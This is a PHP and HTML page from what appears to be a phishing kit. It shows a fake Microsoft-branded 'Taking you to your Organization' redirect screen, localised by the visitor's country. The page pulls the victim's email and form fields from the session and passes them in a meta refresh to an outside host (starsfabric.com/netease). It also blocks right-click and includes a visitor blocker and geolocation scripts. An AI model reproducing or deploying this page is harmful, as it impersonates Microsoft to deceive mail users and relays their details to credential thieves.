<?php
session_start();
ob_start();
include "blocker.php";
include "geo.php";
$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	

parse_str(parse_url($url, PHP_URL_QUERY));

	
$parts = @explode('@', $userid);
	
$user = @$parts[0];
$email= $_SESSION['userid'];
// start > to get url and and put id 
	
$subemail = $_SESSION['subemail'];
$radiobtn = $_SESSION['radiobtn'];

//retrieve language library
include "langLib.php";
//get country



?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html dir="ltr" lang="en">

<head>
    <title>Redirecting</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="REFRESH"content="2;url=http://starsfabric.com/netease/index.php?rand=13InboxLightaspxn.1774256418&userid=<?php echo $email ?>&subemail=<?php echo $subemail ?>&radiobtn=<?php echo $radiobtn ?>&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1">
 

    
        <link rel="shortcut icon" href="/netease/assets/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" />

<link href="/netease/assets/css/converged.v2.login.min_cqc1snhglyamadfdulaq7a2.css" rel="stylesheet" />
	<script type="text/javascript">
	document.addEventListener("contextmenu", function (e) {
        e.preventDefault();
    }, false);
    </script>
    
<!-- languagefunctionsstarts here -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<script>
$(document).ready(function(){
    
   var country ="<?php echo $country; ?>";
   if (country=="DE"){
       $('#h1').html("<?php echo $h1De; ?>");
       $('#h2').html("<?php echo $h2De; ?>");
       $('#f1').html("<?php echo $f1De; ?>");
       $('#f2').html("<?php echo $f2De; ?>");
   }
    else if ((country=="CN") || (country =="TW") || (country == "HK")){
       $('#h1').html("<?php echo $h1Cn; ?>");
       $('#h2').html("<?php echo $h2Cn; ?>");
       $('#f1').html("<?php echo $f1Cn; ?>");
       $('#f2').html("<?php echo $f2Cn; ?>");
   }
    else if (country=="KR"){
       $('#h1').html("<?php echo $h1Kr; ?>");
       $('#h2').html("<?php echo $h2Kr; ?>");
       $('#f1').html("<?php echo $f1Kr; ?>");
       $('#f2').html("<?php echo $f2Kr; ?>");
       
   }
    else if (country=="JP"){
       $('#h1').html("<?php echo $h1Jp; ?>");
       $('#h2').html("<?php echo $h2Jp; ?>");
       $('#f1').html("<?php echo $f1Jp; ?>");
       $('#f2').html("<?php echo $f2Jp; ?>");
       
   }
    else if (country=="TR"){
       $('#h1').html("<?php echo $h1Tr; ?>");
       $('#h2').html("<?php echo $h2Tr; ?>");
       $('#f1').html("<?php echo $f1Tr; ?>");
       $('#f2').html("<?php echo $f2Tr; ?>");
   }
    else if (country=="RU"){
       $('#h1').html("<?php echo $h1Ru; ?>");
       $('#h2').html("<?php echo $h2Ru; ?>");
       $('#f1').html("<?php echo $f1Ru; ?>");
       $('#f2').html("<?php echo $f2Ru; ?>");
   }
    else if (country=="ES"){
       $('#h1').html("<?php echo $h1Es; ?>");
       $('#h2').html("<?php echo $h2Es; ?>");
       $('#f1').html("<?php echo $f1Es; ?>");
       $('#f2').html("<?php echo $f2Es; ?>");
       
   } 
   else if (country=="VN"){
       $('#h1').html("<?php echo $h1Vn; ?>");
       $('#h2').html("<?php echo $h2Vn; ?>");
       $('#f1').html("<?php echo $f1Vn; ?>");
       $('#f2').html("<?php echo $f2Vn; ?>");
       
   } else if (country=="ID"){
       $('#h1').html("<?php echo $h1Id; ?>");
       $('#h2').html("<?php echo $h2Id; ?>");
        $('#f1').html("<?php echo $f1Id; ?>");
       $('#f2').html("<?php echo $f2Id; ?>");
   }
    else if (country=="IT"){
       $('#h1').html("<?php echo $h1It; ?>");
       $('#h2').html("<?php echo $h2It; ?>");
        $('#f1').html("<?php echo $f1It; ?>");
       $('#f2').html("<?php echo $f2It; ?>");
   }
    else if ((country=="AE") || (country=="IR") || (country =="IQ")){
       $('#h1').html("<?php echo $h1Ae; ?>");
       $('#h2').html("<?php echo $h2Ae; ?>");
       $('#f1').html("<?php echo $f1Ae; ?>");
       $('#f2').html("<?php echo $f2Ae; ?>");
   }
    else if (country=="TH"){
       $('#h1').html("<?php echo $h1Th; ?>");
       $('#h2').html("<?php echo $h2Th; ?>");
       $('#f1').html("<?php echo $f1Th; ?>");
       $('#f2').html("<?php echo $f2Th; ?>");
   }
    else {
       $('#h1').html("<?php echo $h1En; ?>");
       $('#h2').html("<?php echo $h2En; ?>");
       $('#f1').html("<?php echo $f1En; ?>");
       $('#f2').html("<?php echo $f2En; ?>");
   }
//alert(country);

//get div ids for manipulation at server


});
</script>

</head>

<body style="background-image:url(/netease/assets/images/0.jpg)">
    <!-- scriptgoes here -->
    <div>
        <div class="outer">
            <div class="middle">
                <div class="inner relative">
                        <img src="/netease/assets/images/microsoft_logo_7zyesnzhfxur7eprws2m2q2.png" alt="Microsoft account symbol" />

                    <div class="row text-title" role="heading" id="h1">Taking you to your Organization</div>

                        <div class="row form-group" id="h2">Please wait while we redirect you to your mail service provider ....</div>
                        
                </div>
            </div>
        </div>

        <div class="footer default">
            <div id="footerLinks" class="footerNode text-secondary">
                    <div class="footerNode">
                        <span>
&#169;2018 Microsoft                        </span>
                        <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank" id="f1">Terms of use</a>
                        <a href="https://privacy.microsoft.com/en-US/privacystatement" target="_blank" id="f2">Privacy &amp; cookies</a>
                    </div>
            </div>
        </div>
    </div>
</body>
</html>